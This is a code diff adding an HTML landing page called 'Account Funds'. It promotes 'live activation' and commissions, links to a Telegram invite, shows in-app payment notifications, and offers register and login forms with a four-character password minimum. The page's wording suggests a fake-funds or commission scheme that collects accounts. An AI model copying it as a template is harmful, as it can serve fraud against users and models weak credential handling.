@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Funds</title>
+    <meta name="description" content="Account Funds - Live activation dashboard with in-app payment notifications and transaction management." />
+    <meta property="og:title" content="Account Funds" />
+    <meta property="og:description" content="Account Funds - Live activation dashboard with in-app payment notifications and transaction management." />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body class="premium">
+    <!-- LIVE ACTIVATION BANNER -->
+    <div class="banner">
+        <strong>⚠️ LIVE ACTIVATION</strong>
+    </div>
+
+    <!-- IN-APP PAYMENT NOTIFICATION CONTAINER -->
+    <div id="paymentNotificationContainer" class="payment-notification-container" aria-live="assertive"></div>
+
+    <div class="container">
+        <!-- Telegram Icon -->
+        <a href="https://t.me/+gPDN87ly87liYTc1" class="telegram-icon" target="_blank" title="Join our Telegram">
+            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M16 0C7.16 0 0 7.16 0 16s7.16 16 16 16 16-7.16 16-16-7.16-16-16-16zm7.69 10.94l-1.18 5.57c-.09.44-.32.57-.65.57-.36 0-1.02-.18-1.59-.35 1.21.79 2.13 1.28 3.01 1.73.32.17.51.43.44.71l-.83 5.44c-.09.49-.48.62-.98.41-2.31-1.29-3.71-2.07-5.02-3.22-.94.85-2.09 1.9-3.21 2.96-.38.35-.7.48-1.05.15l-.56-3.75c-.06-.4.08-.63.49-.78 2.36-.77 4.81-1.57 6.94-2.69-1.72-1.57-3.48-3.16-4.63-4.23-.4-.37-.26-.93.24-1.15l3.65-.82c.35-.08.65.07.82.38l2.15 4.39c.12.24.31.35.54.29.57-.16 1.21-.37 1.82-.59.27-.1.48.04.53.31z" fill="currentColor"/>
+            </svg>
+        </a>
+
+        <!-- Welcome Section -->
+        <div class="welcome-section" id="welcomeSection">
+            <div class="welcome-card">
+                <h1 class="welcome-text">ACCOUNT FUNDS</h1>
+                <p class="tagline">LIVE ACTIVATION & EARN COMMISSION</p>
+            </div>
+        </div>
+
+        <!-- Tab Navigation -->
+        <div class="tab-container" id="tabContainer">
+            <button type="button" class="tab-button active" data-tab="register">Register</button>
+            <button type="button" class="tab-button" data-tab="login">Login</button>
+        </div>
+
+        <!-- Registration Section -->
+        <div id="registerTab" class="tab-content active">
+            <div class="form-card">
+                <h3>Create Your Account</h3>
+                <form id="registerForm">
+                    <div class="form-group">
+                        <label for="regEmail">Email Address</label>
+                        <input type="email" id="regEmail" name="email" placeholder="Enter your email" required>
+                        <small id="emailError" class="error-message"></small>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="regUsername">Create Username</label>
+                        <input type="text" id="regUsername" name="username" placeholder="Enter username (min 3 chars)" required>
+                        <small id="usernameError" class="error-message"></small>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="regPassword">Create Password</label>
+                        <input type="password" id="regPassword" name="password" placeholder="Enter password (min 4 chars)" required>
+                        <small id="passwordError" class="error-message"></small>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary">Register</button>
+                </form>
+                <div id="registerMessage" class="message"></div>
+            </div>
+        </div>
+
+        <!-- Login Section -->
+        <div id="loginTab" class="tab-content">
+            <div class="form-card">
+                <h3>Login to Your Account</h3>
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label for="loginUsername">Username</label>
+                        <input type="text" id="loginUsername" name="username" placeholder="Enter your username" required>
+                        <small id="loginUsernameError" class="error-message"></small>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="loginPassword">Password</label>
+                        <input type="password" id="loginPassword" name="password" placeholder="Enter your password" required>
+                        <small id="loginPasswordError" class="error-message"></small>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary">Login</button>
+                </form>
+                <div id="loginMessage" class="message"></div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
